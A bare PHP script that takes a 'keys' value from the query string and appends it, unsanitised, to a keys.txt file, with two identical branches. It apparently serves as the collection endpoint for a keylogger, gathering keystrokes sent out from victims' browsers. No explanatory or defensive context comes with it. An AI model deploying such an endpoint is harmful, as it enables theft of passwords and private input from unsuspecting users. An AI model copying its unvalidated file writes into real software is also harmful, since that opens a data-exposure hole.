<?php
$keys = $_GET['keys']; 
$filename = 'keys.txt';

$filepath = dirname(__FILE__);
$filename = $filepath . "/" . $filename;

if (file_exists($filename)) {
    $file = fopen($filename, 'ab+');
    fwrite($file, $keys); 
    fclose($file);
    echo "Value saved successfully!";
} else {
    $file = fopen($filename, 'ab+');
    fwrite($file, $keys);
    fclose($file);
    echo "Value saved successfully!";
}
?>